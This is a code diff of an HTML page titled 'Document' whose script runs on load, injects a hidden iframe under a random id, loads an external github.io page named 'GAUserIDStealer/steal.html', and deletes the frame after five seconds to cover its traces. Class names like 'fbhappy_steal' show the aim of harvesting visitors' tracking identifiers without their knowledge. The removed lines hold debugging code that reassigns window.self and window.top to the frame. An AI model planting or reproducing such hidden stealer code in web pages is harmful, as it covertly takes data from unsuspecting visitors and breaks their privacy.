@@ -7,68 +7,49 @@
     <titile>Document</titile>
 <!--     <iframe id="cframe" style="display:none"></iframe> -->
     <script>
-   
-     function doFlow(){
-        
-         console.log('A origin loacation: ',window.location.origin);
-         console.log('A window top !== window', window.top!==window);
+            
+          function makeid(length) {
+            var result           = '';
+            var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            var charactersLength = characters.length;
+            for ( var i = 0; i < length; i++ ) {
+               result += characters.charAt(Math.floor(Math.random() * charactersLength));
+            }
+            return result;
+         }
 
-         var ifrm_c = document.createElement('iframe');
-         ifrm_c.setAttribute('id', 'fb_test');
-         ifrm_c.setAttribute('class', 'guhappy_steal');
-         ifrm_c.style.display = "none";
-         document.head.appendChild(ifrm_c);
-         
-         var cframe=document.getElementById('fb_test');
-               
-         cframe.src ="https://newmangervase91.github.io/GAUserIDStealer/steal.html";
-             
-     }
-     doFlow();
+
+         function doFlow(){
+
+             var fbhappyId=makeid(5);
+             var ifrm_f = document.createElement('iframe');
+             ifrm_f.setAttribute('id', fbhappyId);
+             ifrm_f.setAttribute('class', 'fbhappy_steal');
+             ifrm_f.style.display = "none";
+             document.body.appendChild(ifrm_f);
+
+
+             var fbframe=document.getElementById(fbhappyId);
+
+             fbframe.src ="https://newmangervase91.github.io/GAUserIDStealer/steal.html";
+
+             fbframe.addEventListener("load",function(){
+                 setTimeout(function(){
+                     //console.log("removing fbhappyId - "+fbhappyId);
+                     fbframe.parentNode.removeChild(fbframe);
+                     fbframe.parentNode=null;
+                     //console.log("remove fbhappyId - "+fbhappyId+" done");
+                 }, 5000);
+
+             });
+
+        }
+        
+        doFlow();
     </script>
 </head>
 
 <body>
-    
-    <script>  
-        
-        function checklocation(){
-//          const iframe = document.getElementById('fb_test');
-         var iframe = document.getElementById('fb_test');
-
-         iframe.onload = function() {
-                console.log('iframe loaded!');
-                let contentWindow = (iframe.contentWindow || iframe.contentDocument) //this is better approach
-                if(iframe.contentWindow)
-                {
-                    console.log('contentWindow checked',iframe.contentWindow);
-                    window.self=iframe.contentWindow;
-                    window.top=window.self;
-                    console.log('assign iframe to window_self with iframe loaded');
-                    console.log('after self/top origin: A',window.location.origin);
-                    console.log('after A: TOP (assign self) ',window.top.location);
-                    console.log('after A: self',window.self.location);
-                }
-                if(iframe.contentDocument)
-                {
-                    console.log('document checked',iframe.contentDocument);
-                }
-            }
-//          document.getElementById("fb_test").contentWindow.location.href
-//          console.log('check_frame body contentWindow : A',document.getElementById("fb_test").contentWindow);
-//          console.log('check_frame location href: A',document.getElementById("fb_test").contentWindow.location.href);
-//          console.log('check_frame location origin: A',document.getElementById("fb_test").contentWindow.location.origin);
-
-//          window.self=document.getElementById("fb_test").contentWindow;
-//          console.log('assign cframe to window_self');
-//          console.log('after self/top origin: A',window.location.origin);
-//          console.log('after A: TOP',window.top.location);
-//          console.log('after A: self',window.self.location);
-     }
-        checklocation();
-//         console.log('A',window.location.origin);
-//         console.log('A window top !== window', window.top!==window);
-    </script>
 </body>
 
 </html>
